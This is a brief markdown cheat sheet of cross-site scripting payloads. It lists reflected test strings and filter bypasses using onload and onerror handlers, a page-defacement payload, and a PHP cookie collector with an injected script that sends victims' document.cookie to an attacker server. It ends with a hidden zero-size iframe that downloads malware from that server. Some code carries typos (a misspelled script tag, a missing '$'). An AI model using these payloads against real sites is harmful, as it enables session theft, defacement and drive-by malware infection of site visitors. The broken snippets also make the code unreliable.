# XSS tricks

## Reflected

### Simple test
This is a simple test to see what happens, this is not a prove that the field is vuln to xss

`<plaintext>`

### Simple XSS test

`<script>alert('Found')</script>`

`"><script>alert(Found)</script>">`

`<script>alert(String.fromCharCode(88,83,83))</script>`

### Bypass filter of tag script

`"  onload="alert(String.fromCharCode(88,83,83))`

`" onload="alert('XSS')`

bla is not a valid image, so this cause an error

`<img src='bla' onerror=alert("XSS")>`

## Persistent

`>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";`


### PHP collector

`> cookie.txt`
`chmod 777 cookie.txt`

edit a php page like colector.php as follow:

```php
<?php
	$cookie=GET['cookie'];
	$useragent=$_SERVER['HTTP_USER_AGENT'];
	$file=fopen('cookie.txt', 'a');
	fwrite($file,"USER AGENT:$useragent || COOKIE=$cookie\n");
	fclose($file);
?>
```

Script to put in page:

`<scritp>new Image().src="http://OUR_SERVER_IP/colector.php?cookie="+document.cookie;</script>`

### Malware Donwloader via XSS

<iframe src="http://OUR_SERVER_IP/OUR_MALWARE" height="0" width="0"></iframe>
